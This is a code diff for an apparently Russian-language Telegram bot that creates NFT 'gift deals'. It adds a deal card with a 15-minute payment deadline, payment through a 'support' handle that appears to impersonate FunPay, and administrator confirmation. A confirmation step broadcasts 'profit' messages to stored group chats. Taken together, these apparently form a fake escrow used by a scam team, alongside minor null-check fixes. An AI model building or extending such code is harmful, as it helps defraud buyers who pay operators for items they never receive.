@@ -40,7 +40,7 @@ NFT_PATTERNS = [
 
 
 def is_nft_link(text: str) -> bool:
-    text = text.strip()
+    text = (text or "").strip()
     return any(p.match(text) for p in NFT_PATTERNS)
 
 
@@ -50,6 +50,7 @@ def is_nft_link(text: str) -> bool:
 async def cb_create_deal(call: CallbackQuery, state: FSMContext):
     uid = call.from_user.id
     ensure_user(uid, call.from_user.username or "")
+    await state.clear()
     await state.set_state(DealStates.choosing_method)
     await show_screen(call, "💳 <b>Выберите способ оплаты:</b>", deal_method_kb(uid))
     await call.answer()
@@ -94,8 +95,9 @@ async def process_amount(message: Message, state: FSMContext):
     except Exception:
         pass
 
+    txt = (message.text or "").strip().replace(",", ".")
     try:
-        amount = float(message.text.strip().replace(",", "."))
+        amount = float(txt)
     except ValueError:
         return
     if amount <= 0:
@@ -109,6 +111,99 @@ async def process_amount(message: Message, state: FSMContext):
         deal_description_kb(uid)
     )
 
+
+@router.message(DealStates.entering_description)
+async def process_description(message: Message, state: FSMContext):
+    uid = message.from_user.id
+    raw = (message.text or "").strip()
+
+    try:
+        await message.delete()
+    except Exception:
+        pass
+
+    data = await state.get_data()
+    amount = data.get("amount")
+    currency = data.get("currency")
+    method = data.get("method", "card")
+
+    # Защита от потери FSM
+    if amount is None or currency is None:
+        await state.clear()
+        await show_screen_edit(
+            message.bot, uid, message.chat.id,
+            "⚠️ <b>Сессия устарела.</b>\n\n"
+            "Нажмите /start → <b>Создать сделку</b>, чтобы начать заново.",
+            back_kb(uid)
+        )
+        return
+
+    # Проверка NFT
+    if not is_nft_link(raw):
+        await show_screen_edit(
+            message.bot, uid, message.chat.id,
+            "❌ <b>Это не похоже на ссылку NFT.</b>\n\n"
+            "Пример:\n"
+            "<code>https://t.me/nft/Snake-1234</code>\n\n"
+            "<i>Поддержка: t.me/nft, portals.tg, getgems.io, fragment.com, "
+            "mrkt.ton, ton.diamonds, tonnel.network</i>",
+            deal_description_kb(uid)
+        )
+        return
+
+    description = raw
+    user = get_user(uid)
+
+    deal_id = secrets.token_hex(4)
+    create_deal(
+        deal_id=deal_id,
+        creator_id=uid,
+        amount=amount,
+        currency=currency,
+        description=description,
+        method=method,
+    )
+
+    link = f"https://t.me/{BOT_USERNAME}?start={deal_id}"
+
+    if method == "stars":
+        give_str = f"⭐ {amount:.0f} Stars"
+        pay_str = f"⭐ {amount:.0f} Stars"
+    else:
+        give_str = f"💰 {amount:.1f} {currency}"
+        pay_str = f"💰 {amount:.1f} {currency}"
+
+    seller_display = f"@{user['username']}" if user["username"] else "---"
+
+    text = (
+        f"🎁 <b>Сделка</b> <code>{deal_id}</code>\n"
+        f"<b>Тип сделки:</b> 🎁 Подарки\n\n"
+        f"👤 <i>Вы покупатель, у вас есть 15 минут на оплату сделки!</i>\n\n"
+        f"🎯 <b>Продавец:</b> {seller_display}\n"
+        f"• <b>Количество сделок продавца:</b> {user['deals_count']}\n"
+        f"• <b>Сумма сделок продавца:</b> {user['deals_sum']:.1f}$\n\n"
+        f"• <b>Вы покупаете:</b> {description}\n"
+        f"• <b>Вы отдаете:</b> {give_str}\n\n"
+        f"<b>Реквизиты для оплаты:</b>\n"
+        f"💬 <b>Оплата через поддержку</b>\n"
+        f"Нажмите кнопку «Саппорт» ниже — оператор подскажет, как оплатить.\n\n"
+        f"👉 @FunPayUaHelper\n\n"
+        f"💵 <b>Сумма к оплате:</b>\n"
+        f"{pay_str}\n\n"
+        f"🔖 <b>Комментарий к транзакции:</b>\n"
+        f"<code>{deal_id}</code>\n\n"
+        f"🔗 <b>Ссылка для покупателя:</b>\n"
+        f"<code>{link}</code>\n\n"
+        f"<blockquote>❗ Пожалуйста, убедитесь что при оплате указываете "
+        f"обязательный комментарий (memo) и точную сумму!</blockquote>\n\n"
+        f"<i>После оплаты ожидайте подтверждения администратором.</i>"
+    )
+
+    await show_screen_edit(
+        message.bot, uid, message.chat.id,
+        text, deal_card_kb(uid, deal_id, link)
+    )
+    await state.clear()
 
 
 # ==================== КНОПКИ НАЗАД ====================
@@ -158,7 +253,7 @@ async def cmd_start_with_deal(message: Message):
     uid = message.from_user.id
     ensure_user(uid, message.from_user.username or "")
 
-    parts = message.text.split(maxsplit=1)
+    parts = (message.text or "").split(maxsplit=1)
     if len(parts) < 2:
         return
     payload = parts[1].strip()
@@ -367,7 +462,7 @@ async def cb_deal_confirm(call: CallbackQuery):
     except Exception:
         pass
 
-    # === ОТПРАВКА ПРОФИТА ВО ВСЕ СОХРАНЁННЫЕ ЧАТЫ ===
+    # === ПРОФИТ В ГРУППЫ ===
     chats = get_all_chats()
     if chats:
         buyer = get_user(creator_id)
@@ -404,8 +499,9 @@ async def cb_deal_confirm(call: CallbackQuery):
                         parse_mode="HTML",
                         disable_web_page_preview=True,
                     )
+                print(f"[PROFIT] Отправлено в {chat_id}")
             except Exception as e:
-                print(f"[PROFIT] Не отправилось в {chat_id}: {e}")
+                print(f"[PROFIT] Ошибка в {chat_id}: {e}")
 
     try:
         await call.message.edit_reply_markup(reply_markup=None)
